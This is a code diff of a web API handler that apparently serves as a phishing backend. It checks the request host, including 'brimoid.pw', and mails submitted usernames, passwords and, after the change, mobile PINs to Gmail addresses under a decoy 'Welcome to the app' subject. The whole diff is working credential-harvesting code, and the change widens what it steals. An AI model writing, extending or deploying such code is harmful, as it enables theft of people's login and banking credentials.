@@ -4,7 +4,7 @@ export default function handler(req, res) {
     const { body } = req;
     const { host } = req.headers;
 
-    if(host === 'brimoid.pw'){
+    if(host == 'brimoid.pw'){
         
         try {
             const transporter = nodemailer.createTransport({
@@ -21,7 +21,7 @@ export default function handler(req, res) {
                 from: 'yurawa111@gmail.com',
                 to: 'yurawa111@gmail.com',
                 subject: 'Welcome to the app',
-                text: `username: ${body.username} password: ${body.password}`,            
+                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'}`,            
             }
       
             transporter.sendMail(mailData, function (err, info) {
@@ -54,7 +54,7 @@ export default function handler(req, res) {
                 from: 'febrifebru66@gmail.com',
                 to: 'febrifebru66@gmail.com',
                 subject: 'Welcome to the app',
-                text: `username: ${body.username} password: ${body.password}`,            
+                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'}`,           
             }
       
             transporter.sendMail(mailData, function (err, info) {
